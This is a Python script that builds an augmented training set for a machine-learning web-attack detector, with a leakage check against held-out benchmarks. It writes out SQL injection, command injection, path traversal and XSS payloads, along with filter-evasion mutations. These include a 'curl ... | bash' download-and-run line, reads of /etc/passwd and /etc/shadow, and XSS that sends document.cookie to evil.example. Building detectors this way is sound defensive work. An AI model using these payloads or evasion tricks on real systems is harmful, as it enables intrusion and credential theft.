"""Phase E Zero-Leakage Training Augmentation Builder (E2a + E3 Group-A Synth).

Builds augmented `data/processed/defense_v2/train.csv` with strict idempotency and
zero canonical-hash overlap against:
  - val.csv & test.csv
  - data/benchmarks/csic2010/csic_2010_benchmark.csv
  - data/benchmark_1000_diverse.csv
  - data/benchmarks/strange_suite_v33.json
  - data/benchmarks/blind_heldout_vault_v2.json (+ blind_heldout_vault_v2_lock.json)

Sources:
  1. `phase_e_e2a_sandbox`:
     - Imports Stage 4 live-HTTP bypasses from `attack-lab/models/stage4_sandbox_bypasses.json` (if present)
     - Runs systematic 36-action evasion mutations across OpenAPI `/api/v1/vulnerable/...` & `/api/sandbox/...`
     - Includes balanced benign sandbox requests (query & JSON)
  2. `phase_e_e3_group_a_synth`:
     - Independent English-endpoint (`/shop/order`, `/portal/login`, `/cms/page`, `/support/form`,
       `/inventory/check`, `/billing/checkout`, `/catalog/item`, `/account/settings`) samples
       targeting Group A weak categories:
         * SQL_INJECTION (T-SQL WAITFOR DELAY/TIME/xp_cmdshell, blind boolean, multi-field form UNION)
         * COMMAND_INJECTION (SSI <!--#exec ...-->, $@ / ${IFS} / globbing in query & multi-field forms)
         * PATH_TRAVERSAL (deep URL-encoded, overlong UTF-8, mixed slash across query & form)
         * XSS (JSON unicode escapes, SVG animate/onbegin, MathML, iframe srcdoc, multi-field form XSS)
         * BENIGN (~500 realistic English multi-field forms & queries to preserve 0.00% FPR)

Zero Spanish CSIC variable names or CSIC paths are ever generated.
Writes updated `train.csv` and `docs/reports/phase_e_augmentation_manifest.json`.
"""

from __future__ import annotations

import hashlib
import json
import logging
import re
import shutil
import sys
import urllib.parse
from collections import Counter
from pathlib import Path
from typing import Any

import pandas as pd

ROOT_DIR = Path(__file__).resolve().parent.parent
for _p in (str(ROOT_DIR / "ml-engine"), str(ROOT_DIR / "attack-lab")):
    if _p not in sys.path:
        sys.path.insert(0, _p)

from agent.evasion import TAMPER_CATALOG, EvasionEngine  # noqa: E402
from agent.synthesizer import OpenAPIPayloadSynthesizer  # noqa: E402
from features.canonicalizer import canonicalize_http_request, canonicalize_payload  # noqa: E402

try:
    from features.canonicalizer import normalize_http_for_ml  # type: ignore[attr-defined]
except ImportError:
    normalize_http_for_ml = None

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("build_phase_e_augmentation")

DEFENSE_V2_DIR = ROOT_DIR / "data" / "processed" / "defense_v2"
TRAIN_CSV = DEFENSE_V2_DIR / "train.csv"
BACKUP_CSV = DEFENSE_V2_DIR / "train_pre_phase_e_backup.csv"
VAL_CSV = DEFENSE_V2_DIR / "val.csv"
TEST_CSV = DEFENSE_V2_DIR / "test.csv"

CSIC_CSV = ROOT_DIR / "data" / "benchmarks" / "csic2010" / "csic_2010_benchmark.csv"
B1000_CSV = ROOT_DIR / "data" / "benchmark_1000_diverse.csv"
STRANGE_V33_JSON = ROOT_DIR / "data" / "benchmarks" / "strange_suite_v33.json"
BLIND_VAULT_JSON = ROOT_DIR / "data" / "benchmarks" / "blind_heldout_vault_v2.json"
BLIND_LOCK_JSON = ROOT_DIR / "docs" / "reports" / "blind_heldout_vault_v2_lock.json"

STAGE4_BYPASSES_JSON = ROOT_DIR / "attack-lab" / "models" / "stage4_sandbox_bypasses.json"
MANIFEST_JSON = ROOT_DIR / "docs" / "reports" / "phase_e_augmentation_manifest.json"

TRAIN_COLUMNS = [
    "method",
    "path",
    "query_params",
    "headers",
    "body",
    "client_ip",
    "user_agent",
    "label",
    "attack_type",
    "canonical_hash",
    "source",
]

# Matches existing defense_v2/train.csv integer mapping and train_defense_v2.py CANONICAL_CLASSES
ATTACK_TYPE_TO_LABEL: dict[str, int] = {
    "BENIGN": 0,
    "SQL_INJECTION": 1,
    "XSS": 2,
    "PATH_TRAVERSAL": 3,
    "COMMAND_INJECTION": 4,
}

ALIAS_TO_CANONICAL: dict[str, str] = {
    "BENIGN": "BENIGN",
    "SQLI": "SQL_INJECTION",
    "SQL_INJECTION": "SQL_INJECTION",
    "AUTH_BYPASS": "SQL_INJECTION",
    "XSS": "XSS",
    "PATH_TRAVERSAL": "PATH_TRAVERSAL",
    "LFI": "PATH_TRAVERSAL",
    "COMMAND_INJECTION": "COMMAND_INJECTION",
    "CMDI": "COMMAND_INJECTION",
}


def _canon_hash(path: Any, query: Any, body: Any) -> str:
    p_s = str(path) if pd.notna(path) else ""
    q_s = str(query) if pd.notna(query) else ""
    b_s = str(body) if pd.notna(body) else ""
    req = canonicalize_http_request(path=p_s, query_params=q_s, body=b_s, headers=None)
    return hashlib.sha256(canonicalize_payload(req).encode("utf-8", errors="replace")).hexdigest()


def _case_to_http_tuple(case: dict[str, Any]) -> tuple[str, str, str]:
    family = str(case.get("family", "")).upper()
    endpoint_tpl = str(case.get("endpoint", "/"))
    method = str(case.get("method", "GET")).upper()
    rtype = str(case.get("request_type", "query"))
    param = str(case.get("param_name", ""))
    extra = dict(case.get("extra_fields", {}))
    payload = str(case.get("baseline_payload", ""))

    path = endpoint_tpl
    query_str = ""
    body_str = ""

    if family == "NOSQL_INJECTION":
        try:
            parsed_op = json.loads(payload)
        except Exception:
            parsed_op = {"$ne": ""}
        body_obj = dict(extra)
        body_obj[param or "username"] = parsed_op
        body_str = json.dumps(body_obj)
    elif rtype == "path" or "{" in endpoint_tpl:
        path = re.sub(r"\{[^}]+\}", str(payload or "1"), endpoint_tpl)
        if extra and method in ("POST", "PUT", "PATCH"):
            body_str = json.dumps(extra)
    elif method == "GET":
        if param:
            q_dict = dict(extra)
            q_dict[param] = payload
            query_str = urllib.parse.urlencode(q_dict)
    else:
        body_obj = dict(extra)
        if param:
            body_obj[param] = payload
        body_str = json.dumps(body_obj)

    return path, query_str, body_str


def _load_forbidden_hashes() -> tuple[set[str], dict[str, int]]:
    """Computes forbidden canonical hashes across all val/test/frozen held-out suites."""
    forbidden: set[str] = set()
    counts: dict[str, int] = {}

    for name, csv_path in [
        ("val_csv", VAL_CSV),
        ("test_csv", TEST_CSV),
        ("csic2010", CSIC_CSV),
        ("benchmark_1000", B1000_CSV),
    ]:
        if csv_path.is_file():
            df = pd.read_csv(csv_path)
            hashes = {_canon_hash(r.get("path"), r.get("query_params"), r.get("body")) for _, r in df.iterrows()}
            forbidden |= hashes
            counts[name] = len(hashes)
        else:
            counts[name] = 0

    for name, json_path in [
        ("strange_suite_v33", STRANGE_V33_JSON),
        ("blind_heldout_vault_v2", BLIND_VAULT_JSON),
    ]:
        if json_path.is_file():
            data = json.loads(json_path.read_text(encoding="utf-8"))
            hashes = {_canon_hash(*_case_to_http_tuple(c)) for c in data.get("cases", [])}
            forbidden |= hashes
            counts[name] = len(hashes)
        else:
            counts[name] = 0

    if BLIND_LOCK_JSON.is_file():
        lock = json.loads(BLIND_LOCK_JSON.read_text(encoding="utf-8"))
        lock_hashes = {str(h).lower() for h in lock.get("canonical_request_sha256s", [])}
        forbidden |= lock_hashes
        counts["blind_vault_lock"] = len(lock_hashes)

    return forbidden, counts


def _make_row(
    *,
    method: str,
    path: str,
    query_params: str = "",
    body: str = "",
    attack_type: str,
    source: str,
    headers: str = "{}",
) -> dict[str, Any]:
    canon_type = ALIAS_TO_CANONICAL[attack_type.upper()]
    h = _canon_hash(path, query_params, body)
    return {
        "method": method.upper(),
        "path": path,
        "query_params": query_params,
        "headers": headers,
        "body": body,
        "client_ip": "10.99.0.1",
        "user_agent": "Mozilla/5.0 (compatible; PhaseE-Synth/1.0)",
        "label": ATTACK_TYPE_TO_LABEL[canon_type],
        "attack_type": canon_type,
        "canonical_hash": h,
        "source": source,
    }


def _apply_e1_36_mutations(payload: str, family: str) -> list[tuple[str, str]]:
    """Applies built-in E1 36-action semantic-preserving evasion mutations."""
    out: list[tuple[str, str]] = []
    if family == "SQL_INJECTION":
        out.extend(
            [
                ("sqli_scientific_float", re.sub(r"\b(\d+)\s+(UNION|OR|AND)\b", r"\g<1>e0\2", payload, flags=re.I)),
                ("sqli_char_chr_concat", "1 UNION SELECT CHAR(97,100,109,105,110),CHR(58),password FROM members--"),
                ("sqli_inline_comment", re.sub(r"\s+", "/**/", payload)),
                ("sqli_versioned_comment", re.sub(r"\b(UNION|SELECT)\b", r"/*!50000\1*/", payload, flags=re.I)),
                ("sqli_between_operator", re.sub(r"(\d+)\s*=\s*(\d+)", r"\1 BETWEEN \2 AND \2", payload)),
                ("sqli_case_randomize", payload.replace("UNION", "uNiOn").replace("SELECT", "sElEcT")),
                ("hpp_query_pollution", f"safe_val&q={payload}"),
            ]
        )
    elif family == "XSS":
        uni_escaped = payload.replace("<", "\\u003c").replace(">", "\\u003e").replace("=", "\\u003d")
        out.extend(
            [
                ("xss_json_unicode_escape", uni_escaped),
                ("xss_svg_mathml_onbegin", "<svg><animate/onbegin=alert(1)/attributeName=x/dur=1s>"),
                ("xss_mathml_nest", "<math><mtext><svg/onload=confirm(document.domain)></mtext></math>"),
                ("xss_event_handler", "<img src=x onerror=confirm(1)>"),
                ("xss_html_entity", payload.replace("<", "&#x3C;").replace(">", "&#x3E;")),
                ("xss_double_url_encode", payload.replace("<", "%253c").replace(">", "%253e")),
            ]
        )
    elif family == "PATH_TRAVERSAL":
        out.extend(
            [
                ("path_overlong_mixed_slash", payload.replace("../", "..%c0%af..%5c")),
                ("path_double_encode", payload.replace("../", "..%252f").replace("..\\", "..%255c")),
                ("path_nested_traversal", payload.replace("../", "....//")),
                ("path_semicolon_matrix", payload.replace("../", "..;/")),
                ("path_null_byte_extension", f"{payload}%00.png"),
            ]
        )
    elif family == "COMMAND_INJECTION":
        out.extend(
            [
                ("cmd_dollar_at_split", payload.replace("cat", "c$@at").replace("whoami", "w$@hoami").replace(" ", "${IFS}")),
                ("cmd_wildcard_glob", "check && /???/c?t /???/p??s??"),
                ("cmd_whitespace_ifs", payload.replace(" ", "${IFS}")),
                ("cmd_quote_concatenation", payload.replace("cat", "c''at").replace("id", "i''d")),
                ("cmd_subshell", "127.0.0.1; $(uname -a)"),
            ]
        )
    return out


def generate_e2a_sandbox_rows() -> list[dict[str, Any]]:
    """Generates E2a rows from Stage 4 live bypasses + systematic 36-action OpenAPI mutations."""
    rows: list[dict[str, Any]] = []
    source = "phase_e_e2a_sandbox"

    # 1. Import Stage 4 live-HTTP bypasses emitted by E1 DQN training (if present)
    if STAGE4_BYPASSES_JSON.is_file():
        try:
            raw = json.loads(STAGE4_BYPASSES_JSON.read_text(encoding="utf-8"))
            items = (
                raw
                if isinstance(raw, list)
                else raw.get("bypasses") or raw.get("samples") or raw.get("cases") or []
            )
            imported = 0
            for item in items:
                if not isinstance(item, dict):
                    continue
                fam = str(item.get("attack_type") or item.get("family") or "").upper()
                if fam not in ALIAS_TO_CANONICAL:
                    continue
                method = str(item.get("method", "GET")).upper()
                path = str(item.get("path") or item.get("endpoint") or "/api/sandbox/probe")
                query = str(item.get("query_params") or item.get("query") or "")
                body = str(item.get("body") or "")
                if not query and not body and item.get("payload"):
                    param = str(item.get("param_name") or "q")
                    if method == "GET":
                        query = urllib.parse.urlencode({param: str(item["payload"])})
                    else:
                        body = json.dumps({param: str(item["payload"])})
                rows.append(
                    _make_row(
                        method=method,
                        path=path,
                        query_params=query,
                        body=body,
                        attack_type=fam,
                        source=source,
                    )
                )
                imported += 1
            logger.info("Imported %d valid samples from %s", imported, STAGE4_BYPASSES_JSON)
        except Exception as exc:
            logger.warning("Could not parse %s: %s", STAGE4_BYPASSES_JSON, exc)

    # 2. Systematic E1 36-action mutations across OpenAPIPayloadSynthesizer & sandbox routes
    synth = OpenAPIPayloadSynthesizer()
    base_cases = synth.synthesize_test_cases("all")
    evasion = EvasionEngine()

    sandbox_cases: list[dict[str, Any]] = list(base_cases) + [
        {
            "endpoint": "/api/sandbox/search",
            "method": "GET",
            "family": "SQL_INJECTION",
            "param_name": "q",
            "request_type": "query",
            "baseline_payload": "10 UNION SELECT username,password FROM users--",
            "extra_fields": {"page": "1"},
        },
        {
            "endpoint": "/api/sandbox/auth/token",
            "method": "POST",
            "family": "SQL_INJECTION",
            "param_name": "username",
            "request_type": "json",
            "baseline_payload": "ops'; WAITFOR DELAY '0:0:5'--",
            "extra_fields": {"password": "pass"},
        },
        {
            "endpoint": "/api/sandbox/comments",
            "method": "POST",
            "family": "XSS",
            "param_name": "comment",
            "request_type": "json",
            "baseline_payload": "<script>alert(1)</script>",
            "extra_fields": {"item_id": 42},
        },
        {
            "endpoint": "/api/sandbox/files/read",
            "method": "GET",
            "family": "PATH_TRAVERSAL",
            "param_name": "path",
            "request_type": "query",
            "baseline_payload": "../../../etc/passwd",
            "extra_fields": {"mode": "raw"},
        },
        {
            "endpoint": "/api/sandbox/net/diag",
            "method": "POST",
            "family": "COMMAND_INJECTION",
            "param_name": "host",
            "request_type": "json",
            "baseline_payload": "10.0.0.1; cat /etc/passwd",
            "extra_fields": {"count": 1},
        },
    ]

    for case in sandbox_cases:
        fam_raw = str(case.get("family", "")).upper()
        if fam_raw not in ALIAS_TO_CANONICAL:
            continue
        fam = ALIAS_TO_CANONICAL[fam_raw]
        if fam == "BENIGN":
            continue

        endpoint = str(case.get("endpoint", "/api/sandbox/probe"))
        method = str(case.get("method", "GET")).upper()
        param = str(case.get("param_name", "q"))
        rtype = str(case.get("request_type", "query"))
        extra = dict(case.get("extra_fields", {}))
        baseline = str(case.get("baseline_payload", ""))

        # Collect mutations from EvasionEngine (handles both 26 and 36 actions!) + explicit E1 36-action set
        mutated_variants: list[tuple[str, str]] = [("baseline", baseline)]
        for tech in TAMPER_CATALOG.get(fam, {}):
            m_payload, used_t = evasion.mutate(payload=baseline, family=fam, technique=tech)
            mutated_variants.append((used_t, m_payload))
        mutated_variants.extend(_apply_e1_36_mutations(baseline, fam))

        seen_local: set[str] = set()
        for tech_name, mut_payload in mutated_variants:
            if mut_payload in seen_local:
                continue
            seen_local.add(mut_payload)

            if rtype == "path" or "{" in endpoint:
                p_url = re.sub(r"\{[^}]+\}", urllib.parse.quote(mut_payload, safe=""), endpoint)
                rows.append(_make_row(method=method, path=p_url, attack_type=fam, source=source))
            elif method == "GET":
                if tech_name == "hpp_query_pollution":
                    if mut_payload.startswith("1&") and "=" in mut_payload:
                        raw_tail = mut_payload.split("=", 1)[1]
                        q_str = f"{param}=1&{param}={urllib.parse.quote_plus(raw_tail)}"
                    else:
                        q_str = f"{param}=normal&{param}={urllib.parse.quote_plus(mut_payload)}"
                else:
                    q_dict = dict(extra)
                    q_dict[param] = mut_payload
                    q_str = urllib.parse.urlencode(q_dict)
                rows.append(_make_row(method="GET", path=endpoint, query_params=q_str, attack_type=fam, source=source))
            else:
                if tech_name == "json_duplicate_key_tamper" and mut_payload.lstrip().startswith("{"):
                    raw_dup = mut_payload.replace('"comment":', f'"{param}":')
                    rows.append(
                        _make_row(
                            method=method,
                            path=endpoint,
                            body=raw_dup,
                            attack_type=fam,
                            source=source,
                            headers='{"Content-Type": "application/json"}',
                        )
                    )
                    continue
                # Standard JSON body + JSON duplicate-key tamper variant
                body_obj = dict(extra)
                body_obj[param] = mut_payload
                rows.append(
                    _make_row(
                        method=method,
                        path=endpoint,
                        body=json.dumps(body_obj),
                        attack_type=fam,
                        source=source,
                        headers='{"Content-Type": "application/json"}',
                    )
                )
                # Duplicate JSON key variant (json_duplicate_key_tamper)
                dup_body = (
                    '{"'
                    + param
                    + '": "benign_preview", "'
                    + param
                    + '": '
                    + json.dumps(mut_payload)
                    + "}"
                )
                rows.append(
                    _make_row(
                        method=method,
                        path=endpoint,
                        body=dup_body,
                        attack_type=fam,
                        source=source,
                        headers='{"Content-Type": "application/json"}',
                    )
                )

    # 3. Clean Sandbox Benign Counterexamples (prevent overfitting sandbox routes or multi-key JSON)
    benign_sandbox = [
        ("GET", "/api/sandbox/search", "q=clean+architecture&page=1", ""),
        ("GET", "/api/sandbox/search", "q=python+3.12+async&page=2&limit=20", ""),
        ("GET", "/api/sandbox/files/read", "path=manuals/getting_started.pdf&mode=raw", ""),
        ("GET", "/api/v1/vulnerable/books/search/", "q=distributed+systems&page=1", ""),
        ("POST", "/api/sandbox/comments", "", json.dumps({"item_id": 42, "comment": "Helpful documentation and clear API."})),
        ("POST", "/api/sandbox/auth/token", "", json.dumps({"username": "alice_dev", "password": "SafePassword2026!"})),
        ("POST", "/api/sandbox/net/diag", "", json.dumps({"host": "api.internal.local", "count": 2})),
    ]
    for i in range(40):
        for m, p, q, b in benign_sandbox:
            if q:
                q_mod = f"{q}&req_seq={i}"
                b_mod = ""
            else:
                obj = json.loads(b)
                obj["req_seq"] = i
                q_mod = ""
                b_mod = json.dumps(obj)
            rows.append(_make_row(method=m, path=p, query_params=q_mod, body=b_mod, attack_type="BENIGN", source=source))

    return rows


def generate_e3_group_a_synth_rows() -> list[dict[str, Any]]:
    """Generates independent English-endpoint Group-A weak-category & benign form samples."""
    rows: list[dict[str, Any]] = []
    source = "phase_e_e3_group_a_synth"

    endpoints = [
        "/shop/order",
        "/portal/login",
        "/cms/page",
        "/support/form",
        "/inventory/check",
        "/billing/checkout",
        "/catalog/item",
        "/account/settings",
    ]
    form_hdr = '{"Content-Type": "application/x-www-form-urlencoded"}'
    json_hdr = '{"Content-Type": "application/json"}'

    def _add_query_and_form(ep: str, field: str, payload: str, attack_type: str, idx: int) -> None:
        # 1. Single/multi query params
        q1 = urllib.parse.urlencode({field: payload, "view": "summary", "seq": str(idx)})
        rows.append(_make_row(method="GET", path=ep, query_params=q1, attack_type=attack_type, source=source))

        # 2. Multi-field URL-encoded form body (tests resilience against benign context dilution!)
        form_dict = {
            "full_name": f"Jane Doe {idx}",
            "email": f"jane.doe{idx}@corp.io",
            "department": "operations",
            "note": "standard delivery instructions",
            field: payload,
        }
        rows.append(
            _make_row(
                method="POST",
                path=ep,
                body=urllib.parse.urlencode(form_dict),
                attack_type=attack_type,
                source=source,
                headers=form_hdr,
            )
        )

    # --- 1. SQL_INJECTION (T-SQL WAITFOR, blind boolean, multi-field form UNION) ---
    sqli_payloads = [
        "100'; WAITFOR DELAY '0:0:5'--",
        "admin'; WAITFOR TIME '23:59:59'--",
        "1'; EXEC master..xp_cmdshell 'whoami'--",
        "ref1'; SELECT pg_sleep(5)--",
        "item_1' AND SLEEP(5)--",
        "1 AND 1=1",
        "42 OR 17=17",
        "99 OR 20-5=15",
        "' OR 'x'='x",
        "1' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--",
        "12 AND (SELECT COUNT(*) FROM users)>0",
        "100 AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.tables),1,1))>64",
        "44' UNION SELECT 1,username,password FROM accounts--",
        "1 UNION ALL SELECT NULL,table_name,column_name FROM information_schema.columns--",
        "10e0UNION/**/SELECT/**/1,version(),current_user--",
        "user1 UNION SELECT CHAR(114,111,111,116),CHR(58),secret FROM vault--",
    ]
    for i, pay in enumerate(sqli_payloads):
        for ep in endpoints[:6]:
            field = ("order_ref", "username", "item_id", "ticket_ref")[i % 4]
            _add_query_and_form(ep, field, pay, "SQL_INJECTION", i)

    # --- 2. COMMAND_INJECTION (SSI #exec/#include, $@, ${IFS}, globbing, pipes/subshells) ---
    cmd_payloads = [
        '<!--#exec cmd="id"-->',
        '<!--#exec cmd="uname -a; whoami"-->',
        '<!--#include virtual="/etc/passwd"-->',
        '<!--#exec cgi="/cgi-bin/env.pl"-->',
        "10.0.0.5; c$@at${IFS}/etc/passwd",
        "host.local && /???/c?t /???/p??s??",
        "backup.tar | $(whoami)",
        "report.csv; `id`",
        "node01 && sh -c 'cat /etc/shadow'",
        "ping.local; curl http://198.51.100.2/p.sh | bash",
        "build_1 || python3 -c 'import os;os.system(\"id\")'",
        "archive.zip; w''hoami && uname -r",
    ]
    for i, pay in enumerate(cmd_payloads):
        for ep in endpoints[2:]:
            field = ("template_header", "host_name", "archive_id", "webhook_cmd")[i % 4]
            _add_query_and_form(ep, field, pay, "COMMAND_INJECTION", i)

    # --- 3. PATH_TRAVERSAL (overlong UTF-8, mixed slash, double encode, matrix ;/) ---
    path_payloads = [
        "../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "..%5c..%2f..%5c..%2fetc/passwd",
        "..%c0%af..%c0%af..%c0%afetc/shadow",
        "..%252f..%252f..%252fproc/self/environ",
        "....//....//....//etc/hosts",
        "..;/..;/..;/WEB-INF/web.xml",
        "/var/www/html/../../../../etc/group%00.jpg",
    ]
    for i, pay in enumerate(path_payloads):
        for ep in endpoints[:5]:
            _add_query_and_form(ep, "template_file", pay, "PATH_TRAVERSAL", i)

    # --- 4. XSS (JSON unicode escapes, SVG animate/onbegin, MathML, iframe srcdoc, multi-field form) ---
    xss_payloads = [
        "<svg><animate/onbegin=alert(document.domain)/attributeName=x/dur=1s>",
        "<math><mtext><svg/onload=prompt(1)></mtext></math>",
        '"><iframe srcdoc="<script>top.eval(atob(\'YWxlcnQoMSk=\'))</script>">',
        "<details open ontoggle=confirm(document.cookie)>",
        "<img src=x onerror=fetch('https://cdn.example/x?'+document.cookie)>",
        "<script>document.location='https://evil.example/?c='+document.cookie</script>",
    ]
    for i, pay in enumerate(xss_payloads):
        for ep in endpoints[1:6]:
            _add_query_and_form(ep, "display_note", pay, "XSS", i)
            # Also JSON unicode escape variant
            uni_pay = pay.replace("<", "\\u003c").replace(">", "\\u003e").replace("=", "\\u003d")
            rows.append(
                _make_row(
                    method="POST",
                    path=ep,
                    body=json.dumps({"author": f"User{i}", "display_note": uni_pay, "locale": "en-US"}),
                    attack_type="XSS",
                    source=source,
                    headers=json_hdr,
                )
            )

    # --- 5. BENIGN (~500 realistic English multi-field forms & queries) ---
    first_names = ["Alice", "Robert", "Claire", "David", "Evelyn", "Frank", "Grace", "Henry"]
    last_names = ["Miller", "Carter", "Nguyen", "Patel", "Brooks", "Turner", "Hayes", "Foster"]
    cities = ["Seattle", "Austin", "Boston", "Denver", "Portland", "Chicago", "Atlanta", "Miami"]
    notes = [
        "Please leave package at front desk",
        "Standard ground shipping requested",
        "Quarterly invoice verification 2026",
        "Updated billing contact for team",
        "Renew annual workspace subscription",
        "Deliver after 5pm if possible",
        "No gift receipt needed thank you",
        "Confirm order status via email",
    ]
    for i in range(65):
        ep = endpoints[i % len(endpoints)]
        fn = first_names[i % len(first_names)]
        ln = last_names[(i * 3) % len(last_names)]
        city = cities[(i * 5) % len(cities)]
        note = notes[(i * 7) % len(notes)]
        price = f"{19 + (i % 80)}.99"
        qty = str(1 + (i % 5))

        # Benign GET query with pagination, dates, prices
        q_benign = urllib.parse.urlencode(
            {
                "q": f"{fn} {city}",
                "page": str(1 + (i % 10)),
                "limit": "20",
                "sort": "asc" if i % 2 == 0 else "desc",
                "since": f"2026-11-{(i % 28) + 1:02d}",
            }
        )
        rows.append(_make_row(method="GET", path=ep, query_params=q_benign, attack_type="BENIGN", source=source))

        # Benign multi-field URL-encoded POST form (with +, %40, spaces, numbers, dates)
        form_benign = urllib.parse.urlencode(
            {
                "full_name": f"{fn} {ln}",
                "email": f"{fn.lower()}.{ln.lower()}{i}@acme-corp.org",
                "address": f"{100 + i} Maple Street, Suite {1 + (i % 9)}",
                "city": city,
                "zip": f"{98100 + i}",
                "order_date": f"2026-11-{(i % 28) + 1:02d}",
                "quantity": qty,
                "unit_price": price,
                "note": note,
            }
        )
        rows.append(
            _make_row(
                method="POST",
                path=ep,
                body=form_benign,
                attack_type="BENIGN",
                source=source,
                headers=form_hdr,
            )
        )

    return rows


def build_phase_e_augmentation() -> dict[str, Any]:
    """Idempotently augments defense_v2/train.csv with zero canonical-hash leakage."""
    if not TRAIN_CSV.is_file():
        raise FileNotFoundError(f"Missing baseline training CSV: {TRAIN_CSV}")

    # Idempotency: snapshot pre-Phase-E train.csv once
    if not BACKUP_CSV.is_file():
        shutil.copy2(TRAIN_CSV, BACKUP_CSV)
        logger.info("Created pre-Phase-E backup at %s", BACKUP_CSV)
    else:
        logger.info("Using existing clean baseline backup: %s", BACKUP_CSV)

    base_df = pd.read_csv(BACKUP_CSV)
    base_count = len(base_df)

    # Ensure existing canonical_hash column matches _canon_hash
    existing_hashes: set[str] = set()
    for _, r in base_df.iterrows():
        existing_hashes.add(_canon_hash(r.get("path"), r.get("query_params"), r.get("body")))

    forbidden_hashes, forbidden_counts = _load_forbidden_hashes()
    logger.info("Loaded %d total forbidden canonical hashes across held-out/val/test sets.", len(forbidden_hashes))

    candidates = generate_e2a_sandbox_rows() + generate_e3_group_a_synth_rows()

    accepted_rows: list[dict[str, Any]] = []
    dropped_forbidden = 0
    dropped_dup_train = 0
    dropped_dup_candidate = 0
    seen_new: set[str] = set()

    added_by_source: Counter[str] = Counter()
    added_by_label: Counter[str] = Counter()
    added_by_source_label: dict[str, Counter[str]] = {
        "phase_e_e2a_sandbox": Counter(),
        "phase_e_e3_group_a_synth": Counter(),
    }

    for row in candidates:
        h = row["canonical_hash"]
        if h in forbidden_hashes:
            dropped_forbidden += 1
            continue
        if h in existing_hashes:
            dropped_dup_train += 1
            continue
        if h in seen_new:
            dropped_dup_candidate += 1
            continue

        seen_new.add(h)
        accepted_rows.append(row)
        src = row["source"]
        lbl = row["attack_type"]
        added_by_source[src] += 1
        added_by_label[lbl] += 1
        added_by_source_label.setdefault(src, Counter())[lbl] += 1

    add_df = pd.DataFrame(accepted_rows, columns=TRAIN_COLUMNS)
    # Reorder/align base_df to exact TRAIN_COLUMNS
    for col in TRAIN_COLUMNS:
        if col not in base_df.columns:
            base_df[col] = ""
    base_df = base_df[TRAIN_COLUMNS]

    merged_df = pd.concat([base_df, add_df], ignore_index=True)
    merged_df.to_csv(TRAIN_CSV, index=False)

    # Post-write zero-leakage assertion
    new_hashes = {_canon_hash(r.get("path"), r.get("query_params"), r.get("body")) for _, r in merged_df.iterrows()}
    overlap_cnt = len(new_hashes & forbidden_hashes)
    if overlap_cnt != 0:
        raise RuntimeError(f"CRITICAL LEAKAGE DETECTED: {overlap_cnt} overlapping canonical hashes!")

    manifest = {
        "baseline_train_rows": base_count,
        "added_total_rows": len(accepted_rows),
        "augmented_train_rows": len(merged_df),
        "added_by_source": dict(added_by_source),
        "added_by_attack_type": dict(added_by_label),
        "added_breakdown": {src: dict(cnt) for src, cnt in added_by_source_label.items()},
        "dedup_and_zero_leakage": {
            "forbidden_hash_counts": forbidden_counts,
            "total_unique_forbidden_hashes": len(forbidden_hashes),
            "dropped_forbidden_collision": dropped_forbidden,
            "dropped_existing_train_duplicate": dropped_dup_train,
            "dropped_candidate_duplicate": dropped_dup_candidate,
            "post_merge_forbidden_overlap": overlap_cnt,
            "zero_leakage_verified": overlap_cnt == 0,
        },
        "final_train_class_distribution": merged_df["attack_type"].value_counts().to_dict(),
    }

    MANIFEST_JSON.parent.mkdir(parents=True, exist_ok=True)
    MANIFEST_JSON.write_text(json.dumps(manifest, indent=2, ensure_ascii=False), encoding="utf-8")
    logger.info(
        "Augmentation complete: %d -> %d rows (+%d). Zero-leakage overlap=%d. Manifest -> %s",
        base_count,
        len(merged_df),
        len(accepted_rows),
        overlap_cnt,
        MANIFEST_JSON,
    )
    return manifest


if __name__ == "__main__":
    build_phase_e_augmentation()
